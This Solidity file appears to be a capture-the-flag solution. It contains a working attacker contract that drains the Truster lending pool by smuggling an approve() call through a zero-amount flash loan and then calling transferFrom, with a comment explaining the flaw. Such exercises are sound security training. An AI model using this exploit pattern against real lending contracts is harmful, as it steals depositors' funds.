// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "./TrusterLenderPool.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

/**
    The lender contract makes an external call to and arbitrary address and that can be exploit
    the contract took a borrow of 0 tokens but makes an approve to itself, the flashloan is executed
    succesfuly so the transaction doesnt revert and then transferFrom its called and the funds drained
 */
contract TrusterAttacker {
    function attack(TrusterLenderPool _poolContract, IERC20 _tokenContract) external {

        bytes memory txData = abi.encodeWithSignature("approve(address,uint256)", address(this),1000000 ether); 
        _poolContract.flashLoan(0, msg.sender, address(_tokenContract), txData);

        _tokenContract.transferFrom(address(_poolContract),msg.sender,1000000 ether);

    }
}
